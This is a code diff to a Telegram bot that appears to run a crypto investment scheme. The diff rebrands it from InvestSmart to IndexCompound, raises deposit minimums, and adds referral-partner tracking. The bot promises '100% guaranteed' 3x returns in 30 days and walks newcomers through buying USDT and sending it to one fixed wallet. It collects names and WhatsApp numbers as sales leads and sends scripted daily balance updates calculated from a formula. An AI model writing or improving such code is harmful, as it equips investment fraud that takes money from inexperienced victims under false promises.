@@ -9,11 +9,19 @@ const USDT_NETWORK = "TRC-20 (TRON)";
 const bot = new TelegramBot(TOKEN, { polling: true });
 
 const DB_FILE = "./investors.json";
+const PARTNERS_FILE = "./partners.json";
+
 function loadDB() {
   try { return JSON.parse(fs.readFileSync(DB_FILE, "utf8")); } catch (e) { return {}; }
 }
 function saveDB(db) {
   fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
+}
+function loadPartners() {
+  try { return JSON.parse(fs.readFileSync(PARTNERS_FILE, "utf8")); } catch (e) { return {}; }
+}
+function savePartners(p) {
+  fs.writeFileSync(PARTNERS_FILE, JSON.stringify(p, null, 2));
 }
 
 const sessions = {};
@@ -23,9 +31,9 @@ function getSession(chatId) {
 }
 
 const PLANS = [
-  { id: "starter", emoji: "🌱", name: "Starter Plan", invest: 100,   payout: 300,   days: 30, minDeposit: 100,   maxDeposit: 499       },
-  { id: "silver",  emoji: "⚡", name: "Silver Plan",  invest: 500,   payout: 1500,  days: 30, minDeposit: 500,   maxDeposit: 1999      },
-  { id: "gold",    emoji: "🏆", name: "Gold Plan",    invest: 2000,  payout: 6000,  days: 30, minDeposit: 2000,  maxDeposit: 9999      },
+  { id: "starter", emoji: "🌱", name: "Starter Plan", invest: 500,   payout: 1500,  days: 30, minDeposit: 500,   maxDeposit: 999       },
+  { id: "silver",  emoji: "⚡", name: "Silver Plan",  invest: 1000,  payout: 3000,  days: 30, minDeposit: 1000,  maxDeposit: 4999      },
+  { id: "gold",    emoji: "🏆", name: "Gold Plan",    invest: 5000,  payout: 15000, days: 30, minDeposit: 5000,  maxDeposit: 9999      },
   { id: "vip",     emoji: "💎", name: "VIP Plan",     invest: 10000, payout: 30000, days: 30, minDeposit: 10000, maxDeposit: 999999999 },
 ];
 
@@ -65,12 +73,11 @@ const MAIN_MENU = {
 const BACK_MENU = {
   reply_markup: { keyboard: [[{ text: "⬅️ Back to Main Menu" }]], resize_keyboard: true },
 };
-
-const HOW_IT_WORKS = "📈 *How It Works*\n\n*1️⃣ Pick a plan* — from $100 up to any amount\n*2️⃣ Buy USDT* — using PayPal, Cash App, Zelle or any exchange\n*3️⃣ Send payment* — to your assigned wallet (TRC-20)\n*4️⃣ Plan activates* — within 1-2 hours of confirmation\n*5️⃣ Daily updates* — your balance sent to you here every day\n*6️⃣ Payout* — full amount sent to your wallet on Day 30\n\n━━━━━━━━━━━━━━━━━━━\n📊 *Example — Starter Plan:*\n💵 You invest: *$100 USDT*\n📈 Daily growth: *+$6.67/day*\n• Day 10 → *$166.70*\n• Day 20 → *$233.40*\n• Day 30 → *$300.00*\n\n✅ Daily balance updates\n✅ No hidden fees\n✅ 100% guaranteed payouts";
+const HOW_IT_WORKS = "📈 *How It Works*\n\n*1️⃣ Pick a plan* — from $500 up to any amount\n*2️⃣ Buy USDT* — using PayPal, Cash App, Zelle or any exchange\n*3️⃣ Send payment* — to your assigned wallet (TRC-20)\n*4️⃣ Plan activates* — within 1-2 hours of confirmation\n*5️⃣ Daily updates* — your balance sent to you here every day\n*6️⃣ Payout* — full amount sent to your wallet on Day 30\n\n━━━━━━━━━━━━━━━━━━━\n📊 *Example — Starter Plan:*\n💵 You invest: *$500 USDT*\n📈 Daily growth: *+$33.33/day*\n• Day 10 → *$833.30*\n• Day 20 → *$1,166.60*\n• Day 30 → *$1,500.00*\n\n✅ Daily balance updates\n✅ No hidden fees\n✅ 100% guaranteed payouts";
 
 const HOW_TO_BUY = "💳 *How to Buy USDT*\n\nNew to crypto? No problem!\n\n━━━━━━━━━━━━━━━━━━━\n*1️⃣ Coinbase (Easiest)*\n1. Download Coinbase app and sign up\n2. Link your bank or debit card\n3. Search USDT and tap Buy\n4. Go to Send, paste our wallet address\n5. Select TRON (TRC-20) as network\n\n━━━━━━━━━━━━━━━━━━━\n*2️⃣ Binance*\n1. Download Binance app and create account\n2. Tap Buy Crypto and choose payment method\n3. Buy USDT\n4. Go to Wallet, Withdraw, paste our wallet\n5. Select TRC20 network and confirm\n\n━━━━━━━━━━━━━━━━━━━\n*3️⃣ PayPal*\n1. Open PayPal app and tap Crypto\n2. Select USDT (Tether)\n3. Buy with your PayPal balance or bank\n4. Tap Transfer, External Wallet, paste our address\n⚠️ Select TRC-20 network when withdrawing\n\n━━━━━━━━━━━━━━━━━━━\n*4️⃣ Cash App*\n1. Buy Bitcoin on Cash App\n2. Transfer to Coinbase or Binance\n3. Swap to USDT and withdraw via TRC-20\n\n━━━━━━━━━━━━━━━━━━━\n*5️⃣ Zelle*\n1. Zelle money to your bank\n2. Open Coinbase or Binance\n3. Link bank, deposit USD, buy USDT\n4. Withdraw via TRC-20 to our wallet\n\n━━━━━━━━━━━━━━━━━━━\n⚠️ *ALWAYS use TRC-20 network!*\nUsing wrong network = lost funds\n\nNeed help? Contact our support team!";
 
-const FAQ_TEXT = "❓ *Frequently Asked Questions*\n\n*Q: What is USDT?*\nA: USDT (Tether) is a digital dollar — 1 USDT = $1 USD. Stable, fast, and perfect for investments.\n\n*Q: What is TRC-20?*\nA: TRC-20 is the network USDT travels on. It is fast and has very low fees. Always select TRC-20 when sending to us.\n\n*Q: How do I get daily updates?*\nA: Once your payment is confirmed, your plan activates and this bot sends you a balance update every single day automatically.\n\n*Q: When do I receive my payout?*\nA: On Day 30 your full payout is sent to your USDT wallet.\n\n*Q: Can I invest any amount?*\nA: Yes! Minimum is $100. Any amount earns proportional daily returns.\n\n*Q: Can I reinvest after 30 days?*\nA: Yes — many clients roll profits into the next cycle.\n\n*Q: How do I prove I sent payment?*\nA: Screenshot your transfer and send it to our support team on WhatsApp.";
+const FAQ_TEXT = "❓ *Frequently Asked Questions*\n\n*Q: What is USDT?*\nA: USDT (Tether) is a digital dollar — 1 USDT = $1 USD. Stable, fast, and perfect for investments.\n\n*Q: What is TRC-20?*\nA: TRC-20 is the network USDT travels on. It is fast and has very low fees. Always select TRC-20 when sending to us.\n\n*Q: How do I get daily updates?*\nA: Once your payment is confirmed, your plan activates and this bot sends you a balance update every single day automatically.\n\n*Q: When do I receive my payout?*\nA: On Day 30 your full payout is sent to your USDT wallet.\n\n*Q: Can I invest any amount?*\nA: Yes! Minimum is $500. Any amount earns proportional daily returns.\n\n*Q: Can I reinvest after 30 days?*\nA: Yes — many clients roll profits into the next cycle.\n\n*Q: How do I prove I sent payment?*\nA: Screenshot your transfer and send it to our support team on WhatsApp.";
 
 function getPlansMsg() {
   var msg = "💼 *Our Investment Plans*\n\n_30 days • 3x returns • USDT only_\n\n";
@@ -87,7 +94,7 @@ function getPlansMsg() {
   return msg;
 }
 
-const LEAD_STEPS = ["name", "phone", "amount", "readiness"];
+const LEAD_STEPS = ["name", "phone", "amount", "referral", "readiness"];
 const READINESS_MAP = { 1: "Today 🔥", 2: "Within 24hrs", 3: "This week", 4: "Just exploring" };
 
 async function sendLeadToChannel(lead) {
@@ -95,11 +102,23 @@ async function sendLeadToChannel(lead) {
   var plan = getPlan(amount);
   var daily = dailyProfit(plan, amount);
   var payout = amount + daily * 30;
-  var msg = "🔔 *NEW INVESTOR LEAD*\n━━━━━━━━━━━━━━━━━━━\n👤 *Name:* " + lead.name + "\n📱 *WhatsApp:* " + lead.phone + "\n💰 *Amount:* " + fmt(amount) + " USDT\n📋 *Plan:* " + plan.name + "\n📈 *Daily:* +" + fmt(daily) + "/day\n🏆 *Payout:* " + fmt(payout) + "\n⚡ *Readiness:* " + lead.readiness + "\n🆔 *Chat ID:* `" + lead.chatId + "`\n━━━━━━━━━━━━━━━━━━━\n🪙 *Wallet:* `" + USDT_WALLET + "`\n🔗 *Network:* " + USDT_NETWORK + "\n📅 " + new Date().toUTCString();
+  var referralLine = lead.referral && lead.referral !== "none" && lead.referral !== "skip"
+    ? "\n🤝 *Referred by:* " + lead.referral
+    : "\n🤝 *Referred by:* Direct (no referral)";
+  var msg = "🔔 *NEW INVESTOR LEAD*\n━━━━━━━━━━━━━━━━━━━\n👤 *Name:* " + lead.name + "\n📱 *WhatsApp:* " + lead.phone + "\n💰 *Amount:* " + fmt(amount) + " USDT\n📋 *Plan:* " + plan.name + "\n📈 *Daily:* +" + fmt(daily) + "/day\n🏆 *Payout:* " + fmt(payout) + "\n⚡ *Readiness:* " + lead.readiness + referralLine + "\n🆔 *Chat ID:* `" + lead.chatId + "`\n━━━━━━━━━━━━━━━━━━━\n🪙 *Wallet:* `" + USDT_WALLET + "`\n🔗 *Network:* " + USDT_NETWORK + "\n📅 " + new Date().toUTCString();
   try {
     await bot.sendMessage(LEADS_CHANNEL, msg, { parse_mode: "Markdown" });
   } catch (err) {
     console.error("Channel error:", err.message);
+  }
+  if (lead.referral && lead.referral !== "none" && lead.referral !== "skip") {
+    var partners = loadPartners();
+    var refKey = lead.referral.toLowerCase().replace(/\s+/g, "_");
+    if (!partners[refKey]) {
+      partners[refKey] = { name: lead.referral, leads: 0, investors: 0, totalInvested: 0 };
+    }
+    partners[refKey].leads += 1;
+    savePartners(partners);
   }
 }
 
@@ -126,11 +145,10 @@ async function sendDailyUpdates() {
 }
 
 setInterval(sendDailyUpdates, 24 * 60 * 60 * 1000);
-
 bot.onText(/\/start/, function(msg) {
   var s = getSession(msg.chat.id);
   s.step = "idle"; s.data = {};
-  bot.sendMessage(msg.chat.id, "👋 *Welcome to InvestSmart!*\n\nGrow your USDT into *3x returns in just 30 days* — with daily balance updates so you watch every dollar stack up.\n\n💸 *Our Plans:*\n🌱 $100 → *$300* in 30 days\n⚡ $500 → *$1,500* in 30 days\n🏆 $2,000 → *$6,000* in 30 days\n💎 $10,000 → *$30,000* in 30 days\n\n📈 Daily updates • USDT payments • Guaranteed payouts\n\n*What would you like to do?* 👇", { parse_mode: "Markdown", reply_markup: MAIN_MENU.reply_markup });
+  bot.sendMessage(msg.chat.id, "👋 *Welcome to IndexCompound!*\n\nGrow your USDT into *3x returns in just 30 days* — with daily balance updates so you watch every dollar stack up.\n\n💸 *Our Plans:*\n🌱 $500 → *$1,500* in 30 days\n⚡ $1,000 → *$3,000* in 30 days\n🏆 $5,000 → *$15,000* in 30 days\n💎 $10,000 → *$30,000* in 30 days\n\n📈 Daily updates • USDT payments • Guaranteed payouts\n\n*What would you like to do?* 👇", { parse_mode: "Markdown", reply_markup: MAIN_MENU.reply_markup });
 });
 
 bot.onText(/\/activate (\d+) (\d+\.?\d*)/, async function(msg, match) {
@@ -141,10 +159,40 @@ bot.onText(/\/activate (\d+) (\d+\.?\d*)/, async function(msg, match) {
   var payout = amount + daily * 30;
   var db = loadDB();
   var name = (db[targetChatId] && db[targetChatId].name) ? db[targetChatId].name : "Investor";
-  db[targetChatId] = { name: name, chatId: targetChatId, amount: amount, payout: payout, planName: plan.name, startDate: Date.now(), status: "active" };
+  var referral = (db[targetChatId] && db[targetChatId].referral) ? db[targetChatId].referral : null;
+  db[targetChatId] = { name: name, chatId: targetChatId, amount: amount, payout: payout, planName: plan.name, referral: referral, startDate: Date.now(), status: "active" };
   saveDB(db);
+  if (referral && referral !== "none" && referral !== "skip") {
+    var partners = loadPartners();
+    var refKey = referral.toLowerCase().replace(/\s+/g, "_");
+    if (!partners[refKey]) partners[refKey] = { name: referral, leads: 0, investors: 0, totalInvested: 0 };
+    partners[refKey].investors += 1;
+    partners[refKey].totalInvested += amount;
+    savePartners(partners);
+    try {
+      await bot.sendMessage(LEADS_CHANNEL, "💳 *REFERRAL CREDITED*\n━━━━━━━━━━━━━━━━━━━\n🤝 Partner: *" + referral + "*\n👤 Investor: *" + name + "*\n💰 Amount: *" + fmt(amount) + " USDT*\n📋 Plan: *" + plan.name + "*\n⚠️ Reward pending negotiation with partner", { parse_mode: "Markdown" });
+    } catch(e) {}
+  }
   await bot.sendMessage(targetChatId, "✅ *Payment Confirmed — Plan Activated!*\n\nWelcome aboard, " + name + "! 🎉\n\n━━━━━━━━━━━━━━━━━━━\n📋 Plan: *" + plan.name + "*\n💵 Invested: *" + fmt(amount) + " USDT*\n📈 Daily earnings: *+" + fmt(daily) + "/day*\n🏆 30-day payout: *" + fmt(payout) + " USDT*\n━━━━━━━━━━━━━━━━━━━\n\nYour balance is now growing every day! You will receive a *daily update* right here starting tomorrow. 📊\n\nSit back and watch your money grow! 💰", { parse_mode: "Markdown" });
   await bot.sendMessage(msg.chat.id, "✅ Investor " + targetChatId + " activated for " + fmt(amount));
+});
+
+bot.onText(/\/partners/, async function(msg) {
+  var partners = loadPartners();
+  var keys = Object.keys(partners);
+  if (keys.length === 0) {
+    return bot.sendMessage(msg.chat.id, "No partners yet.");
+  }
+  var report = "📊 *Partner Referral Report*\n━━━━━━━━━━━━━━━━━━━\n";
+  for (var i = 0; i < keys.length; i++) {
+    var p = partners[keys[i]];
+    report += "\n🤝 *" + p.name + "*\n";
+    report += "• Leads brought: *" + p.leads + "*\n";
+    report += "• Confirmed investors: *" + p.investors + "*\n";
+    report += "• Total invested: *" + fmt(p.totalInvested) + " USDT*\n";
+  }
+  report += "\n━━━━━━━━━━━━━━━━━━━\n_Reward % negotiated per partner_";
+  bot.sendMessage(msg.chat.id, report, { parse_mode: "Markdown" });
 });
 
 bot.on("message", async function(msg) {
@@ -169,25 +217,36 @@ bot.on("message", async function(msg) {
       var daily = dailyProfit(plan, amount);
       var payout = amount + daily * 30;
       var db = loadDB();
-      db[chatId] = { name: s.data.name, chatId: chatId, amount: amount, payout: payout, status: "pending" };
+      db[chatId] = { name: s.data.name, chatId: chatId, amount: amount, payout: payout, referral: s.data.referral, status: "pending" };
       saveDB(db);
       await sendLeadToChannel(s.data);
       return bot.sendMessage(chatId, "✅ *You're Registered!*\n\nYour payment wallet has been assigned:\n\n`" + USDT_WALLET + "`\n\n🔗 *Network: " + USDT_NETWORK + "*\n💵 *Send exactly: " + fmt(amount) + " USDT*\n\n━━━━━━━━━━━━━━━━━━━\n📋 *Your Plan*\n" + plan.emoji + " *" + plan.name + "*\n• Daily earnings: *+" + fmt(daily) + "/day*\n• 30-day payout: *" + fmt(payout) + " USDT*\n━━━━━━━━━━━━━━━━━━━\n\n*Next Steps:*\n1️⃣ Buy USDT if you haven't yet (tap *💳 How to Buy USDT*)\n2️⃣ Send *exactly " + fmt(amount) + " USDT* using *TRC-20 network*\n3️⃣ Screenshot your transfer and send to our team on WhatsApp\n4️⃣ Your plan activates within *1-2 hours*\n\n📞 Our team will also reach you on *" + s.data.phone + "* shortly.\n\nOnce active, you will get *daily balance updates* right here! 📈", { parse_mode: "Markdown", reply_markup: MAIN_MENU.reply_markup });
     }
 
+    if (step === "referral") {
+      var refVal = text.toLowerCase();
+      if (refVal === "no" || refVal === "none" || refVal === "skip" || refVal === "n/a") {
+        s.data.referral = "none";
+      } else {
+        s.data.referral = text;
+      }
+      s.step = "readiness";
+      return bot.sendMessage(chatId, "Almost done! ⚡\n\nHow soon can you send payment?\n\n1️⃣ Today!\n2️⃣ Within 24 hours\n3️⃣ This week\n4️⃣ Just checking for now\n\nReply *1, 2, 3 or 4*:", { parse_mode: "Markdown", reply_markup: BACK_MENU.reply_markup });
+    }
+
     if (step === "amount") {
       var val = parseFloat(text.replace(/[$,]/g, ""));
-      if (isNaN(val) || val < 100) {
-        return bot.sendMessage(chatId, "Minimum is *$100 USDT*. Please enter a valid amount:", { parse_mode: "Markdown" });
+      if (isNaN(val) || val < 500) {
+        return bot.sendMessage(chatId, "Minimum is *$500 USDT*. Please enter a valid amount:", { parse_mode: "Markdown" });
       }
       s.data.rawAmount = val;
       s.data.amount = fmt(val);
-      s.step = "readiness";
+      s.step = "referral";
       var plan = getPlan(val);
       var daily = dailyProfit(plan, val);
       var payout = val + daily * 30;
       var table = buildGrowthTable(val);
-      return bot.sendMessage(chatId, "💰 *Your Investment Breakdown*\n\n" + plan.emoji + " Plan: *" + plan.name + "*\n💵 Deposit: *" + fmt(val) + " USDT*\n📈 Daily earnings: *+" + fmt(daily) + "/day*\n🏆 30-day payout: *" + fmt(payout) + " USDT*\n💸 Profit: *+" + fmt(payout - val) + " USDT*\n\n━━━━━━━━━━━━━━━━━━━\n📅 *Daily Growth Preview*\n```\n" + table + "```\n━━━━━━━━━━━━━━━━━━━\nAlmost done! How soon can you send payment?\n\n1️⃣ Today!\n2️⃣ Within 24 hours\n3️⃣ This week\n4️⃣ Just checking for now\n\nReply *1, 2, 3 or 4*:", { parse_mode: "Markdown", reply_markup: BACK_MENU.reply_markup });
+      return bot.sendMessage(chatId, "💰 *Your Investment Breakdown*\n\n" + plan.emoji + " Plan: *" + plan.name + "*\n💵 Deposit: *" + fmt(val) + " USDT*\n📈 Daily earnings: *+" + fmt(daily) + "/day*\n🏆 30-day payout: *" + fmt(payout) + " USDT*\n💸 Profit: *+" + fmt(payout - val) + " USDT*\n\n━━━━━━━━━━━━━━━━━━━\n📅 *Daily Growth Preview*\n```\n" + table + "```\n━━━━━━━━━━━━━━━━━━━\nWere you referred by someone?\n\nIf yes, type their *name or code*.\nIf no, type *SKIP*", { parse_mode: "Markdown", reply_markup: BACK_MENU.reply_markup });
     }
 
     s.data[step] = text;
@@ -197,7 +256,7 @@ bot.on("message", async function(msg) {
     var prompts = {
       name: "🚀 *Let's Activate Your Plan!*\n\nWhat's your *full name*?",
       phone: "Thanks " + (s.data.name || "") + "! 📱\n\nWhat's your *WhatsApp number*?",
-      amount: "💰 How much would you like to invest?\n\nType any amount — e.g. *100*, *500*, *2000*\n_Minimum: $100 USDT_",
+      amount: "💰 How much would you like to invest?\n\nType any amount — e.g. *500*, *1000*, *5000*\n_Minimum: $500 USDT_",
     };
     return bot.sendMessage(chatId, prompts[next] || "", { parse_mode: "Markdown", reply_markup: BACK_MENU.reply_markup });
   }
@@ -228,7 +287,7 @@ bot.on("message", async function(msg) {
   if (text === "💳 How to Buy USDT") return bot.sendMessage(chatId, HOW_TO_BUY, { parse_mode: "Markdown", reply_markup: BACK_MENU.reply_markup });
   if (text === "🧮 Calculate Returns") {
     s.step = "calc"; s.data = {};
-    return bot.sendMessage(chatId, "🧮 *Returns Calculator*\n\nHow much are you thinking of investing?\n\nType any amount — e.g. *100*, *500*, *2000*", { parse_mode: "Markdown", reply_markup: BACK_MENU.reply_markup });
+    return bot.sendMessage(chatId, "🧮 *Returns Calculator*\n\nHow much are you thinking of investing?\n\nType any amount — e.g. *500*, *1000*, *5000*", { parse_mode: "Markdown", reply_markup: BACK_MENU.reply_markup });
   }
   if (text === "🚀 Invest Now") {
     s.step = "name"; s.data = {};
@@ -238,4 +297,4 @@ bot.on("message", async function(msg) {
   bot.sendMessage(chatId, "Use the menu below 👇", MAIN_MENU);
 });
 
-console.log("🤖 InvestSmart Bot is running...");
+console.log("🤖 IndexCompound Bot is running...");
